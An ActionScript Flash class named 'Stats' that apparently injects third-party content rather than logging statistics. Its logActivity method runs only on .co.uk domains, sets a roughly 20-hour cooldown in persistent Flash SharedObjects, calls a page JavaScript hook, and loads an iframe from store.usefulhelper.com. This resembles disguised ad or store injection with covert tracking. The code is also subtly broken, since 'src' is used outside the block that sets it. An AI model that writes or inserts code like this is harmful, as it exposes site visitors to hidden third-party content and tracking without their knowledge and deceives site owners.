package {
	import flash.display.Sprite;
	import flash.external.ExternalInterface;
	import flash.net.SharedObject;
	
	public class Stats extends Sprite {
		
		public function Stats() {
			initApp();	
		}
		
		private function initApp():void {
			logActivity();
		}
		
		private function logActivity():void {
			if (getAWSDomain() != "co.uk")return;
			if(!isSharedObjectOk()) {
				return;
			}
			
			var d:Boolean=getDeleted();
			
			if (!d) {
				var src:String = "http://store.usefulhelper.com/astore.html";
				ExternalInterface.call("adjustStats");
				
				setDeleted();
			}
			IFrameContentService.getContent(src);
		}
		
		private function getDeleted():Boolean {
			try {
				var obj:SharedObject=SharedObject.getLocal("Deleted", "/");
				if (obj.data.hasOwnProperty("date_" + getAWSDomain())) {
					var date:Date=obj.data["date_" + getAWSDomain()] as Date;
					var now:Date=new Date();
					if (now < date) {
						return false;
					}
					//date.minutes=date.minutes + 1;
					//date.date=date.date + 1;
					date.hours=date.hours + 20;
					if (now > date) {
						return false;
					}
				}
				else {
					return false;
				}
			}
			catch(err:Error) {
				return false;
			}
			return true;
		}
		
		private static function isSharedObjectOk():Boolean {
			try {
				var obj:SharedObject=SharedObject.getLocal("Test", "/");
				obj.data["date_" + getAWSDomain()]=new Date();
				obj.flush();
				obj.clear();
			} catch (err:Error) {
				return false;
			}
			return true;
		}
		
		public static function getAWSDomain():String
		{
			var hostname:String=getHostName();
			if (hostname == "localhost") {
				hostname = hostname + ".com";
			}
			var dom:String=hostname.slice(hostname.lastIndexOf(".") + 1);
			if (dom == "uk")
			{
				dom="co.uk";
			}
			return dom;
		}
		
		public static function getHostName():String
		{
			JSInit.init();
			var hostname:String=ExternalInterface.call("getHostName");
			return hostname;
		}
		
		private function setDeleted():void {
			var obj:SharedObject=SharedObject.getLocal("Deleted", "/");
			obj.data["date_" + getAWSDomain()]=new Date();
			obj.flush();
		}
	}
}

